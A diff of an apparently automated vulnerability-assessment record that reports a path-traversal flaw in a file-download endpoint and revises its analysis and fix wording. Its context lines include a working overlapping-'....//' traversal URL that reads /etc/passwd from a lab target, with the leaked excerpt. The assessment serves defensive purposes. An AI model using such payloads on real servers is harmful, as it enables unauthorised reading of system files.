@@ -15,8 +15,8 @@
   "reviewed_by": "claude-opus-4-8",
   "assessment": "vulnerable",
   "weakness_class": "non_recursive_strip",
-  "llm_analysis": "The single-pass replace of traversal sequences allows overlapping patterns to collapse back into valid traversal after removal, and there is no canonicalization check confining the path to UPLOADS.",
-  "recommended_fix": "Resolve the final path with path.resolve and verify it starts with the UPLOADS directory before reading, rather than relying on string stripping.",
+  "llm_analysis": "The single-pass replace of traversal sequences is non-recursive, so overlapping patterns reconstitute valid traversal after one removal and escape the uploads directory.",
+  "recommended_fix": "Resolve the final path with path.resolve and reject it unless it remains within the UPLOADS base directory, rather than relying on string stripping.",
   "controls": {
     "benign_file": {
       "value": "readme.txt",
@@ -41,5 +41,5 @@
     "url": "http://vuln-target:3000/download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd",
     "passwd_excerpt": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"
   },
-  "generated": "2026-10-27T02:40:58.550Z"
+  "generated": "2026-10-31T16:41:39.568Z"
 }
